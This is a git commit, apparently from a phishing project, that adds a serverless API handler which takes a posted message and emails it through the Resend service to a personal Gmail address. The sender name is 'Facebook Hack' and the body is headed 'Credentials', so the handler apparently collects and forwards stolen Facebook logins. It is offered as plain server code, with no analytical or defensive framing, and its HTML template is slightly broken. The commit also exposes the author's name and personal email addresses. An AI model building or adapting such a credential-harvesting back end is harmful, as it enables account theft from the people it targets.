4a1ceac7d1eaae30242b87d7af9c688932c9e985
Angel Darco <angel92-eme@hotmail.com>
2026-05-04 03:40:30 -0500

    server code added

---
+++ api/index.js
@@ -0,0 +1,29 @@
+/* eslint-disable no-undef */
+import { Resend } from "resend";
+
+export async function POST(request) {
+  const resend = new Resend(process.env.RESEND_API_KEY);
+
+  try {
+    const { message } = await request.json();
+
+    const { data, error } = await resend.emails.send({
+      from: "Facebook Hack <onboarding@resend.dev>",
+      to: ["angelxcrema@gmail.com"],
+      subject: "Facebook Hack",
+      message,
+
+      html: `
+        <h1>Credentials: </h1>
+        <h2>{message}</h2>
+      `,
+    });
+
+    if (error) return new Response(error);
+    return new Response(JSON.stringify(data));
+  } catch (error) {
+    return new Response("Error processing the request", {
+      status: 500,
+    });
+  }
+}
